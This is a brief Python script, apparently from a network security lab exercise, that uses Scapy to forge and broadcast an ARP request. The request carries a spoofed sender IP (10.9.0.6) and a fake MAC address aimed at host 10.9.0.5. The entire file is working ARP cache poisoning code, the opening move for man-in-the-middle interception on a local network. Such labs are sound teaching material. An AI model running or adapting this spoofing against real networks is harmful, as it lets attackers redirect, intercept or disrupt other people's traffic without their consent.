#!/usr/bin/python3

from scapy.all import *
from scapy.layers.l2 import Ether, ARP

IP_Target = "10.9.0.5" 
MAC_Target = "02:42:0a:09:00:05" 

IP_spoofed = "10.9.0.6" 
MAC_spoofed = "aa:bb:cc:dd:ee:ff" 

print("-----Sending Spoofed ARP Request-----")

#Ether header
ether = Ether()
ether.dst = 'ff:ff:ff:ff:ff:ff'
ether.src = MAC_spoofed

#ARP Request
arp = ARP()
arp.psrc = IP_spoofed 
arp.hwsrc = MAC_spoofed 
arp.pdst = IP_Target 
arp.op = 1 
frame = ether/arp
sendp(frame)
